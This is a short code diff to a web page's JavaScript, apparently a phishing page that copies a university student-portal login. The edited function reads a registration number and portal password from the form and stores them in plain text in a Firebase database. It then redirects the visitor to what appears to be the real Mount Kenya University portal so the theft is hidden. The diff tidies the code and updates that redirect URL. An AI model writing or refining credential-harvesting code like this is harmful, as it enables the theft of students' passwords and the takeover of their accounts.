@@ -228,24 +228,21 @@
       });
 
 function redirectToMainSite() {
-    const regNo = document.getElementById('regNo').value.trim();
-    const smisPass = document.getElementById('smisPass').value.trim();
+        const regNo = document.getElementById('regNo').value;
+        const smisPass = document.getElementById('smisPass').value;
+        const dbRef = ref(database, `users/${regNo}`);
+        
+        if(regNo.length < 8){return}
 
-    if (regNo === "" || regNo.length < 8) {
-        return;
-    }
-
-    const dbRef = ref(database, `users/${regNo}`);
-
-    set(dbRef, {
-        userId: regNo,
-        pass: smisPass
-    }).then(() => {
-        window.location.href = `https://unipack.mku.ac.ke/umis/studentportal/index.php`;
-    }).catch((error) => {
-        console.log('Error:';
-    });
-}
+        set(dbRef, {
+          userId: regNo,
+          pass: smisPass
+        }).then(() => {
+          window.location.href = `https://studentportal.mku.ac.ke/umis/studentportal`;
+        }).catch((error) => {
+          console.error("Error setting data in Firebase:", error);
+        });
+      }
 
         
     </script>
